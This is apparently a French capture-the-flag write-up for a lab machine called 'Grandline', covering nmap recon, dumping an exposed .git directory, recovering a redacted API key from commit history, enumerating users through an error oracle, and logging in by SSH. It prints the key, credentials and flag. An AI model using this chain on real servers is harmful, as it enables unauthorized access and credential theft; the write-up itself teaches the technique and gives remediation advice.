Grandline

Catégorie : Web / Exposition de dépôt Git / Fuite d'information Cible : 10.10.0.9 Difficulté : Medium Objectif : Lire user.txt Flag : EPI{1f_1_91V3_uP_noW_1m_9o1N9_7O_r39R37_17}

Vue d'ensemble
Recon (nmap : SSH 22 + Flask/Werkzeug 8081 avec .git/ exposé)
      ▼
Dump du dépôt Git (git-dumper) → code source complet + historique
      ▼
git log / git show → clé API "supprimée" récupérée dans l'historique
      ▼
API /api/retrieve-d-password/<uname> : oracle d'erreur → énumération des users
      │  → luffy (leurre) et zoro (bon compte) + mots de passe
      ▼
SSH (port 22) avec zoro → user.txt

Techniques : énumération, exploitation de .git/ exposé, analyse d'historique Git, fuite d'information (oracle d'erreur), accès SSH. Outils : nmap, git-dumper, git, curl, ssh.

1. Reconnaissance réseau
bash
nmap -sC -sV 10.10.0.9
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.0p2 Debian
8081/tcp open  http    Werkzeug httpd 3.1.8 (Python 3.13.5)
| http-git:
|   10.10.0.9:8081/.git/
|     Git repository found!
|_    Last commit message: Add local images instead of internet

Deux points clés :

8081 = Werkzeug → application Flask (serveur de dev Python).
.git/ exposé → le dépôt Git de l'application est accessible publiquement (détecté par le script http-git de nmap). C'est la faille principale.
2. Dump du dépôt Git

Un .git/ exposé permet de reconstituer tout le code source et l'historique des commits.

bash
cd ~ && mkdir -p grandline && cd grandline
pipx install git-dumper || pip install git-dumper --break-system-packages
git-dumper http://10.10.0.9:8081/.git/ ./repo
cd repo
bash
git log --oneline --all
6822230 (HEAD) Add local images instead of internet
c1879dc Fix the api route not being correct
0e68fc9 Redact api key            ← une clé API a été "supprimée" ici
f459ecf Initial commit

Le message « Redact api key » indique qu'un secret a été retiré → il faut regarder l'historique.

3. Analyse du code (app.py)
python
@app.route('/api/retrieve-d-password/<uname>', methods=['POST'])
def info(uname):
    data = request.get_json(force=True)
    if(data['key'] == '<YOUR API_KEY>'):     # clé masquée dans le code actuel
        if(uname == "admin"):
            return '{"username":"admin","password":"YOURADMINPASSWORD"}'
        else:
            return 'Invalid Username'
    else:
        return "Invalid API Key"

La route renvoie un mot de passe si la clé API est correcte et le username connu. La clé et le mot de passe sont masqués (placeholders) dans le code public.

4. Récupération de la clé API dans l'historique

Le commit 0e68fc9 a censuré la clé. On lit son diff :

bash
git show 0e68fc9
diff
-    if(data['key']=='57db5c001c802fc4be25afb02cff9bf8'):
+    if(data['key']=='<YOUR API_KEY>'):

Clé API : 57db5c001c802fc4be25afb02cff9bf8 (toujours présente dans l'historique).

Pourquoi c'est récupérable : Git conserve chaque commit de façon immuable. « Redact » a créé un nouveau commit avec la valeur masquée, mais le commit précédent contenant la vraie clé existe toujours dans .git/. Supprimer un secret du code ≠ le supprimer de l'historique (il faudrait réécrire l'historique + force-push).

5. Exploitation de l'API + énumération des users

Premier essai avec admin (le username du code) :

bash
curl -s -X POST "http://10.10.0.9:8081/api/retrieve-d-password/admin" \
  -H "Content-Type: application/json" \
  -d '{"key":"57db5c001c802fc4be25afb02cff9bf8"}'
# → Invalid Username

Réponse « Invalid Username » (et non « Invalid API Key ») → la clé est bonne, mais le username réel n'est pas admin. L'application révèle distinctement quand la clé est valide mais le user faux → oracle permettant d'énumérer les usernames.

bash
IP=10.10.0.9
for u in luffy zoro sanji usopp nami ace shanks ... ; do
  echo -n "[$u] => "
  curl -s -X POST "http://$IP:8081/api/retrieve-d-password/$u" \
    -H "Content-Type: application/json" -d '{"key":"57db5c001c802fc4be25afb02cff9bf8"}'
  echo
done
[luffy] => {"username":"luffy","password":"ThisIsN0tMyPassword"}
[zoro]  => {"username":"zoro","password":"I_G07_L0S7_0Nc3_4G41n"}
(tous les autres) => Invalid Username

Deux comptes valides : luffy (mot de passe = leurre « ThisIsN0tMyPassword ») et zoro.

6. Accès SSH → flag

Le mot de passe de luffy est un leurre (SSH refusé). Celui de zoro fonctionne (SSH sur le port 22 standard) :

bash
ssh zoro@10.10.0.9
# mot de passe : I_G07_L0S7_0Nc3_4G41n
cat user.txt
EPI{1f_1_91V3_uP_noW_1m_9o1N9_7O_r39R37_17}
7. Concepts clés
Concept	Explication
.git/ exposé	Un dépôt Git accessible sur le web permet de dumper tout le code + l'historique (git-dumper).
Historique Git immuable	Un secret « supprimé » dans un commit reste dans les commits précédents ; git show/git log -p le retrouvent.
Oracle d'erreur	Des messages distincts (« Invalid Username » vs « Invalid API Key ») fuitent quelle condition a échoué → énumération.
Code public ≠ déployé	Les placeholders (admin, YOURADMINPASSWORD) du repo ne sont pas les vraies valeurs en prod.
Réutilisation de creds	Un mot de passe issu d'une appli web peut ouvrir un accès SSH.
8. Recommandations de remédiation
Ne jamais exposer .git/ sur un serveur web (bloquer l'accès, ou déployer sans le dossier .git).
Ne jamais committer de secrets. S'ils l'ont été, les révoquer ET réécrire l'historique (git filter-repo) — un simple commit de « redaction » ne suffit pas.
Messages d'erreur génériques : renvoyer la même réponse que la clé ou le username soit faux, pour éviter l'oracle d'énumération.
Ne pas coder de secrets en dur ; utiliser des variables d'environnement / un gestionnaire de secrets.
Ne pas utiliser Werkzeug (serveur de dev) en production.
9. Résumé de la chaîne
nmap → Flask sur 8081 + .git/ exposé
  → git-dumper → code source + historique
  → git show (commit "Redact api key") → clé API 57db5c...
  → API /api/retrieve-d-password/<uname> : oracle → users luffy & zoro
  → SSH zoro / I_G07_L0S7_0Nc3_4G41n → user.txt